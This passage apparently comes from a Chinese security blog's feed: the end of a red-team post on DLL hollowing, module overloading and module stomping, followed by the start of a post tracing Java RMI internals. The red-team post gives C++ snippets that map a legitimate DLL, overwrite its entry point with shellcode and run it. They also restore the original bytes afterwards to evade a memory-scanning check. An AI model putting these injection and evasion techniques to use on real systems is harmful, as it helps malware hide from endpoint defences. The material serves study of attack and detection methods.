class=\"line\">&#x2F;&#x2F; Dll：执行入口点 exe：指针执行</span><br><span class=\"line\">int ret &#x3D; run_implant(mapped, ep_rva, is_dll);</span><br></pre></td></tr></table></figure>\n\n<p>那么整个流程如图所示：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720327600259.png\" alt=\"QQ_1720327600259\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240707153548533.png\" alt=\"image-20240707153548533\"></p>\n<h3 id=\"Module-Overloading\"><a href=\"#Module-Overloading\" class=\"headerlink\" title=\"Module Overloading\"></a>Module Overloading</h3><p>该部分思路同上，只是项目中使用了 <strong>映射注入（Mapping Injection）</strong>便归类到Module Overloading中，其实只是技术细节有差别，利用思路大同小异。特点：项目通过 <strong>映射技术之一：NtCreateSection + NtMapViewOfSection 引入合法Dll</strong> 映射到本地进程（也可以映射到远程进程）并直接修改。对该部分的本地视图的更改也会导致远程视图被修改。这里通过使用映射避免使用 <strong>LoadLibrary系列API</strong> </p>\n<p>首先介绍映射技术大体思路：通过一些系统函数组合将磁盘中的文件直接映射到虚拟内存中，将恶意PE进行覆盖或shellcode填充，执行入口。</p>\n<p>有以下几条实现方法 <a href=\"https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5.md\">使用文件映射进行远程进程注入</a>：</p>\n<ul>\n<li>CreateFileMapping → MapViewOfFile  → MapViewOfFile2</li>\n<li>NtCreateSection → NtMapViewOfSection（项目采用方式）</li>\n<li>CreateFileMapping →  MapViewOfFile → NtMapViewOfSection（cobalt strike采用方式）</li>\n</ul>\n<p>那么在项目中代码区别如下，不再使用 LoadLibrary，而是使用映射技术：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PVOID load_target_dll(const char* dll_name)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">#ifdef CLASSIC_HOLLOWING</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;[*] Loading the DLL (using LoadLibary)...\\n&quot;;</span><br><span class=\"line\">\t&#x2F;&#x2F;return LoadLibraryA(dll_name);</span><br><span class=\"line\">\treturn LoadLibraryEx(dll_name, NULL, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class=\"line\">#else</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;[*] Mapping the DLL image...\\n&quot;;</span><br><span class=\"line\">\treturn map_dll_image(dll_name);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">PVOID map_dll_image(const char* dll_name)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 创建合法Dll文件对象</span><br><span class=\"line\">\tHANDLE hFile &#x3D; CreateFileA(dll_name,</span><br><span class=\"line\">\t\tGENERIC_READ,</span><br><span class=\"line\">\t\t0,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tOPEN_EXISTING,</span><br><span class=\"line\">\t\tFILE_ATTRIBUTE_NORMAL,</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tHANDLE hSection &#x3D; nullptr;</span><br><span class=\"line\">\t&#x2F;&#x2F; 为文件对象创建一个section</span><br><span class=\"line\">\tNTSTATUS status &#x3D; NtCreateSection(&amp;hSection,</span><br><span class=\"line\">\t\tSECTION_ALL_ACCESS,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t0,</span><br><span class=\"line\">\t\tPAGE_READONLY,</span><br><span class=\"line\">\t\tSEC_IMAGE,</span><br><span class=\"line\">\t\thFile</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD protect &#x3D; PAGE_EXECUTE_READWRITE;</span><br><span class=\"line\">\tPVOID sectionBaseAddress &#x3D; NULL;</span><br><span class=\"line\">\tSIZE_T viewSize &#x3D; 0;</span><br><span class=\"line\">\tSECTION_INHERIT inheritDisposition &#x3D; ViewShare; &#x2F;&#x2F;VIEW_SHARE</span><br><span class=\"line\">\t&#x2F;&#x2F; 将section映射到内存中</span><br><span class=\"line\">\tif ((status &#x3D; NtMapViewOfSection(hSection,</span><br><span class=\"line\">\t\tNtCurrentProcess(),</span><br><span class=\"line\">\t\t&amp;sectionBaseAddress,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t&amp;viewSize,</span><br><span class=\"line\">\t\tinheritDisposition,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tprotect)</span><br><span class=\"line\">\t\t) !&#x3D; STATUS_SUCCESS)</span><br><span class=\"line\">\t&#x2F;&#x2F; 返回基址</span><br><span class=\"line\">\treturn sectionBaseAddress;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720374014934.png\" alt=\"QQ_1720374014934\"></p>\n<h3 id=\"Module-Stomping\"><a href=\"#Module-Stomping\" class=\"headerlink\" title=\"Module Stomping\"></a>Module Stomping</h3><p>模块踩踏原理同上面二者，主要区别为Stomping不再执行复杂的PE展开、获取偏移、执行入口，而是直接将shellcode覆写到合法Dll中的区域，并且直接执行，由PE加载转为了直接的shellcode加载。</p>\n<p>特点：<strong>将 shellcode 写入到section中，直接获取地址执行</strong></p>\n<p>流程如图：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720453398400.png\" alt=\"QQ_1720453398400\"></p>\n<p>关键代码，通过LoadLibraryEx获取Dll基址，再获取入口点地址，然后覆写、执行shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DWORD oldProtect &#x3D; 0;</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">memcpy(entryPointAddress, shellcode, length);</span><br><span class=\"line\">memset(shellcode, 0, length);</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class=\"line\">HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);</span><br><span class=\"line\">WaitForSingleObject(hThread, INFINITE);</span><br></pre></td></tr></table></figure>\n\n<p>效果，检测的IOC发现.text段的改变，该问题产生原因是由于覆写shellcode导致检测到磁盘中Dll与内存中的.text段内容不同。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720452184625.png\" alt=\"QQ_1720452184625\"></p>\n<p>入口点被覆写为shellcode</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720452376761.png\" alt=\"QQ_1720452376761\"></p>\n<p>为了去除shellcode在内存中的痕迹，可以在执行完shellcode后，将原始内容进行填充，这样避免这一IOC。</p>\n<p>流程图如下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720453700693.png\" alt=\"QQ_1720453700693\"></p>\n<p>关键代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char* buffer &#x3D; new unsigned char[length];</span><br><span class=\"line\">memcpy(buffer, entryPointAddress, length);</span><br><span class=\"line\">DWORD oldProtect &#x3D; 0;</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">memcpy(entryPointAddress, shellcode, length);</span><br><span class=\"line\">memset(shellcode, 0, length);</span><br><span class=\"line\">HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);</span><br><span class=\"line\">Sleep(2000);</span><br><span class=\"line\">memmove(entryPointAddress,buffer,length);</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class=\"line\">cout &lt;&lt; &quot;[*] Done&quot; &lt;&lt; endl;</span><br><span class=\"line\">WaitForSingleObject(hThread, INFINITE);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于远程注入\"><a href=\"#关于远程注入\" class=\"headerlink\" title=\"关于远程注入\"></a>关于远程注入</h3><p>上面所有的DLL Hollowing例子都是自身进程在没有开启CFG（Control Flow Guard）时才能正常运行，在实现远程进程注入时，如果目标开启CFG保护，会抛出CFG异常从而运行失败，关于更多CFG下篇再学习。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://bbs.kanxue.com/thread-274131.htm\">实战dll注入(原理, 踩坑及排雷)</a></p>\n<p>反射Dll：</p>\n<p><a href=\"https://www.cnblogs.com/h2zZhou/p/7721797.html\">DLL注入新姿势：反射式DLL注入研究 - h2z</a></p>\n<p><a href=\"https://xz.aliyun.com/t/11072?time__1311=mqmx0DyDuDBDcDAxxBuQx2GUQ40ITvhRAD&alichlgref=https://\">深入理解反射式dll注入技术</a></p>\n<p><a href=\"https://xz.aliyun.com/t/14639?time__1311=mqmx9Q0=uGDsD7CG7bTDteD=yoC+DQwD&alichlgref=https://cn.bing.com/\">反射DLL注入原理解析</a></p>\n<p><a href=\"https://github.com/sud01oo/ProcessInjection\">https://github.com/sud01oo/ProcessInjection</a></p>\n<p>DLL Hollowing：</p>\n<p><a href=\"https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html\">Improving the stealthiness of memory injections techniques</a></p>\n<p><a href=\"https://www.blackhillsinfosec.com/dll-jmping/\">DLL Jmping: Old Hollow Trampolines in Windows DLL Land</a></p>\n<p><a href=\"https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide\">Burrowing a Hollow in a DLL to Hide</a></p>\n<p><a href=\"https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing\">Masking Malicious Memory Artifacts – Part I: Phantom DLL Hollowing</a></p>\n<p><a href=\"https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/\">DLL Hollowing</a></p>\n<p><a href=\"https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/\">Hiding malicious code with “Module Stomping”</a></p>\n<p>映射注入：</p>\n<p><a href=\"https://idiotc4t.com/code-and-dll-process-injection/mapping-injection\">https://idiotc4t.com/code-and-dll-process-injection/mapping-injection</a></p>\n<p><a href=\"https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5.md\">使用文件映射进行远程进程注入</a></p>\n<p>CFG：</p>\n<p><a href=\"https://bbs.kanxue.com/thread-277740.htm\">利用CFG寻找潜在的ShellCode内存</a></p>\n","categories":["Red-Team"]},{"title":"RMI反序列化初探","url":"/2023/12/25/RMI-attack/","content":"<h1 id=\"RMI\"><a href=\"#RMI\" class=\"headerlink\" title=\"RMI\"></a>RMI</h1><p>关于RMI这部分的学习：<a href=\"https://su18.org/post/rmi-attack/\">Java RMI 攻击由浅入深 | 素十八</a> 以及 <a href=\"https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/\">RMI反序列化漏洞之三顾茅庐-流程分析 | Halfblue</a>，推个视频：<a href=\"https://www.bilibili.com/video/BV1L3411a7ax\">Java反序列化RMI专题</a></p>\n<p>RMI，即 <strong>Remote Method Invocation</strong>，Java 的远程方法调用。RMI 为应用提供了远程调用的接口，可以理解为 Java 自带的 RPC 框架，实现RMI的协议叫JRMP，RMI实现的过程中进行了java对象的传递，自然使用了序列化和反序列化，也自然产生了反序列化漏洞。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h1><p>首先引入两个概念：存根(stub) 以及 服务端骨架(skeletons)</p>\n<blockquote>\n<p>为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。</p>\n</blockquote>\n<p>那么RMI的整个调用过程如下：</p>\n<p>当客户端调用远程对象方法时, <strong>存根</strong> 负责把要调用的远程对象方法的方法名及其参数编组打包,并将该包向下经远程引用层、传输层 <strong>转发给远程对象所在的服务器</strong>。通过 RMI 系统的 <strong>RMI 注册表</strong> 实现的简单服务器名字服务, 可定位远程对象所在的服务器。该包到达服务器后, 向上经远程引用层, 被远程对象的 Skeleton 接收, 此 Skeleton 解析客户包中的方法名及编组的参数后, <strong>在服务器端执行客户要调用的远程对象方法</strong>, 然后将 <strong>该方法的返回值</strong>( 或产生的异常) 打包后通过相反路线返回给客户端, 客户端的 Stub 将返回结果解析后传递给客户程序。</p>\n<p>分开来说：</p>\n<ul>\n<li>1、客户调用客户端辅助对象stub上的方法</li>\n<li>2、客户端辅助对象stub打包调用信息（变量、方法名），通过网络发送给服务端辅助对象skeleton</li>\n<li>3、服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li>\n<li>4、调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton</li>\n<li>5、服务端辅助对象将结果打包，发送给客户端辅助对象stub</li>\n<li>6、客户端辅助对象将返回值解包，返回给调用者</li>\n<li>7、客户获得返回值</li>\n</ul>\n<p>那么以两张图片来总结</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/98f888122f0c4c998d65bb6b475145e6.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/c1bfc6b1cc5747c89c89047422e0d745.png\"></p>\n<h1 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h1><p>首先客户端与服务端都需要定义一个能够远程调用的接口，此接口必须扩展 <strong>java.rmi.Remote</strong> 接口，这个接口中的所有方法都必须声明抛出 <strong>java.rmi.RemoteException</strong> 异常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Remote;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Hello</span> <span class=\"keyword\">extends</span> <span class=\"title\">Remote</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">sayHello</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException</span>;</span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">sayGoodbye</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后创建一个远程接口的实现类，在这个类中重写方法是执行真正的代码逻辑的地方，通常会扩展 <strong>java.rmi.server.UnicastRemoteObject</strong> 类，扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端。这里必须为这个实现类提供一个构造函数并且抛出 RemoteException。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RemoteHelloworld</span> <span class=\"keyword\">extends</span> <span class=\"title\">UnicastRemoteObject</span> <span class=\"keyword\">implements</span> <span class=\"title\">Hello</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"title\">RemoteHelloworld</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 因为 UnicastRemoteObject 构造器抛出 RemoteException</span></span><br><span class=\"line\">        <span class=\"comment\">// 所以此处只能声明一个构造器并抛出对应异常</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">sayHello</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;hello world&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;hello world&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">sayGoodbye</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Bye&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Bye&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来通过 Registry 使用注册来查找一个远端对象的引用，我们通常使用 <strong>LocateRegistry#createRegistry()</strong> 方法来创建注册中心，然后使用bind进行绑定</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Server</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Registry r = LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Registry Start&quot;</span>);</span><br><span class=\"line\">        RemoteHelloworld remoteHelloworld = <span class=\"keyword\">new</span> RemoteHelloworld();</span><br><span class=\"line\">        r.bind(<span class=\"string\">&quot;hello&quot;</span>,remoteHelloworld);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后客户端进行调用：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Client</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取注册中心</span></span><br><span class=\"line\">        Registry registry = LocateRegistry.getRegistry(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">1099</span>);</span><br><span class=\"line\">        Hello stub = (Hello) registry.lookup(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">        System.out.println(stub.sayHello());</span><br><span class=\"line\">        System.out.println(stub.sayGoodbye());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h1><p>深入源码进行分析</p>\n<h2 id=\"远程对象的创建\"><a href=\"#远程对象的创建\" class=\"headerlink\" title=\"远程对象的创建\"></a>远程对象的创建</h2><p>这一部分的源码大多是设计到TCP的一些类，多层的封装，写的代码相当的绕。</p>\n<p>那么首先我们创建了一个远程对象</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RemoteHelloworld remoteHelloworld &#x3D; new RemoteHelloworld();</span><br></pre></td></tr></table></figure>\n\n<p>那么这个类继承了 <strong>UnicastRemoteObject</strong> ，我们来断点调试一下，在调用类的构造方法时会走到 UnicastRemoteObject 的构造方法，传入port默认为0</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707134331917.png\" alt=\"image-20220707134331917\"></p>\n<p>调用其exportObject方法，从名字可以看出，该方法会将我们的远程对象进行一个导出，所以重点看一下这个方法，该方法接受port后创建了一个 <strong>UnicastServerRef</strong> 的对象，其中 UnicastServerRef 类主要与TCP等网络链接相关，那么其中存在着多层的封装，这里就不再进行分析，关于这一部分的详细RMI源码分析：<a href=\"https://cloud.tencent.com/developer/article/1648304\">RMI源码分析 - 腾讯云开发者社区</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707141445463.png\" alt=\"image-20220707141445463\"></p>\n<p>接着往下，其中ref(LiveRef类)为真正处理TCP网络相关的。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707142556716.png\" alt=\"image-20220707142556716\"></p>\n<p>return时又进入了 <strong>UnicastServerRef#exportObject</strong> ，定义了stub即存根，通过 <strong>sun.rmi.server.Util#createProxy()</strong> 创建代理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707144204598.png\" alt=\"image-20220707144204598\"></p>\n<p>可以看到创建了一个动态代理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707170741843.png\" alt=\"image-20220707170741843\"></p>\n<p>返回后，创建 <strong>sun.rmi.transport.Target</strong> 对象，使用这个 <strong>target</strong> 对象封装了我们远程执行方法和生成的动态代理类（Stub）。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707171631905.png\" alt=\"image-20220707171631905\"></p>\n<p>接着调用 <strong>LiveRef#exportObject</strong> 将target发布，接着往下跟到了 <strong>TCPTransport#exportObject</strong>，首先通过 <strong>listen()</strong> 为本地的stub开启了一个随机的端口。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707172613049.png\" alt=\"image-20220707172613049\"></p>\n<p>然后调用 <strong>TCPTransport#exportObject</strong> 方法将 target 实例注册到 <strong>ObjectTable</strong> 中。ObjectTable 用来管理所有发布的服务实例 Target，ObjectTable 提供了根据 ObjectEndpoint 和 Remote 实例两种方式查找 Target 的方法（不同参数的 getTarget 方法）。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707174749252.png\" alt=\"image-20220707174749252\"></p>\n<p><strong>ObjectTable#putTarget</strong> ，最后将target 添加到 <strong>objTable</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707174726243.png\" alt=\"image-20220707174726243\"></p>\n<p>总结：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707174925781.png\" alt=\"image-20220707174925781\"></p>\n<h2 id=\"注册中心的创建\"><a href=\"#注册中心的创建\" class=\"headerlink\" title=\"注册中心的创建\"></a>注册中心的创建</h2><p>注册中心的创建通过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Registry r &#x3D; LocateRegistry.createRegistry(1099);</span><br></pre></td></tr></table></figure>\n\n<p>实例化了  RegistryImpl 并传入默认端口1099</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707183331996.png\" alt=\"image-20220707183331996\"></p>\n<p>创建LiveRef对象用于网络相关，然后创建 <strong>UnicastServerRef</strong> 对象，调用setup方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707184542394.png\" alt=\"image-20220707184542394\"></p>\n<p>在setup方法中依然调用 UnicastServerRef 的 exportObject 方法去 export 对象，只不过这次export的是 <strong>RegistryImpl</strong> 这个对象。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707185003061.png\" alt=\"image-20220707185003061\"></p>\n<p>熟悉的配方 通过createProxy()创建动态代理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190018636.png\" alt=\"image-20220707190018636\"></p>\n<p>但是这里与创建远程对象有一点的不同，这里有一个 <strong>stubClassExists</strong> 的判断，如果为真，则调用 <strong>cerateStub()</strong> 后直接返回</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190214545.png\" alt=\"image-20220707190214545\"></p>\n<p>来看一下判断，去获取要创建代理的类的名字加上 <strong>_Stub</strong> 是否存在</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190436980.png\" alt=\"image-20220707190436980\"></p>\n<p>这里是存在的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190833053.png\" alt=\"image-20220707190833053\"></p>\n<p>然后在createStub中，通过构造方法返回一个 <strong>RegistryImpl_Stub</strong> 实例对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707191149705.png\" alt=\"image-20220707191149705\"></p>\n<p>RegistryImpl_Stub 继承了 RemoteStub ，实现了 Registry。这个类实现了 bind/list/lookup/rebind/unbind 等 Registry 定义的方法，全部是通过序列化和反序列化来实现的。</p>\n<p>createProxy 创建完代理类之后进入 <strong>setSkeleton()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707191719782.png\" alt=\"image-20220707191719782\"></p>\n<p>其中通过<strong>Util#createSkeleton</strong>方法创建 skeleton。skel接收返回值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707191846790.png\" alt=\"image-20220707191846790\"></p>\n<p>去实例化一个 <strong>RegistryImpl_Skel</strong> 对象，返回到 UnicastServerRef 的 <strong>this.skel</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707192111107.png\" alt=\"image-20220707192111107\"></p>\n<p>结束完 setSkeleton() 之后，剩下的export步骤一样，创建target对象进行封装，然后放入到 <strong>objTable</strong> 中</p>\n<p>来看一下objTable中的值，目前有三个</p>\n<p>第一个为DGC为垃圾回收，默认创建</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707193618067.png\" alt=\"image-20220707193618067\"></p>\n<p>第二个为创建的远程对象，stub为动态代理对象，skel为空</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707193707161.png\" alt=\"image-20220707193707161\"></p>\n<p>第三个为注册中心，stub为 RegistryImpl_Stub 对象，skel为 RegistryImpl_Skel 对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707193754466.png\" alt=\"image-20220707193754466\"></p>\n<h2 id=\"服务的注册\"><a href=\"#服务的注册\" class=\"headerlink\" title=\"服务的注册\"></a>服务的注册</h2><p>这里就是对于 <strong>bind</strong> 操作的过程</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">r.bind(&quot;hello&quot;,remoteHelloworld);</span><br></pre></td></tr></table></figure>\n\n<p>通常情况下，如果 Server 端和 Registry 在同一机器，我们可以直接调用 Registry 的 bind 方法进行绑定，具体实现在 RegistryImpl 的 bind 方法，就是将 Remote 对象和名称 String 放在成员变量 <strong>bindings</strong> 中，这是一个 Hashtable 对象。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707194600968.png\" alt=\"image-20220707194600968\"></p>\n<h2 